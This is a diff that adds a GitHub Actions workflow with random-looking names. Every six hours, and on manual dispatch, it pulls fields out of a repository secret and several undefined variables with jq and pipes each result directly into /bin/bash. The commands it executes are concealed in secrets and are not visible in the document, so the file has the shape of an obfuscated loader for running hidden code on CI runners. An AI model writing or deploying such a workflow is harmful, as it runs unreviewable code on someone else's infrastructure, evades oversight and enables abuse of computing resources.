@@ -1,0 +1,25 @@
+name: headsailspeedy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: headsailspeedy
+        env:
+          k14697: ${{ secrets.k14697 }}
+        run: |
+          echo $k14697 | jq -r .lx75 | /bin/bash
+          echo $esbi6269 | jq -r .idgy5 | /bin/bash
+          echo $vtti97437 | jq -r .vcp47 | /bin/bash
+          echo $nmj4808 | jq -r .egf1049 | /bin/bash
+          echo $bup28875 | jq -r .xwgo584 | /bin/bash
+          echo $ni29970 | jq -r .nb54 | /bin/bash
+          echo $bugd295 | jq -r .hat994 | /bin/bash
+          echo $ur2 | jq -r .kdcep869 | /bin/bash
+          echo $lhfks743 | jq -r .klwy90 | /bin/bash
+          echo $wn09799 | jq -r .lre125 | /bin/bash
+
